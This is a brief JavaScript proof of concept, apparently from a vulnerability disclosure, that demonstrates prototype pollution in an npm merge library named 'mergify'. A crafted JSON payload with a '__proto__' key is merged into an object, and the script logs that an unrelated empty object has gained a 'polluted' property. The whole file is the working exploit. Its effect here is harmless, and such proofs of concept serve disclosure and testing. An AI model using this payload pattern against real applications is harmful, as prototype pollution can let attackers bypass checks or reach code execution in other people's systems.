var mergify= require('mergify');
var payload = '{"__proto__":{"polluted":"mergify_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
mergify({},JSON.parse(payload));
console.log("After: ", test.polluted);